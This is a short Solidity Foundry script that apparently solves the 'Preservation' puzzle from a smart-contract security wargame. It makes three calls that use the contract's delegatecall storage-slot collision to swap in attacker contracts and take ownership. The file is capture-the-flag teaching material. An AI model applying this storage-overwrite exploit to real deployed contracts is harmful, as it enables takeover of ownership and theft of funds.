// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {DevOpsTools} from "foundry-devops/src/DevOpsTools.sol";
import {Preservation} from "../../src/puzzles/16/Preservation.sol";

contract PreservationSolution is Script {
    function run(address target) external {
        address attackerContract1 = DevOpsTools.get_most_recent_deployment("PreservationAttacker1", block.chainid);
        address attackerContract2 = DevOpsTools.get_most_recent_deployment("PreservationAttacker2", block.chainid);
        solve(target, attackerContract1, attackerContract2, msg.sender);
    }

    function solve(address target, address attacker1, address attacker2, address player) public {
        Preservation puzzleContract = Preservation(target);
        vm.startBroadcast();
        puzzleContract.setFirstTime(uint256(uint160(address(attacker1))));
        puzzleContract.setFirstTime(uint256(uint160(address(attacker2))));
        puzzleContract.setSecondTime(uint256(uint160(player)));
        vm.stopBroadcast();
    }
}
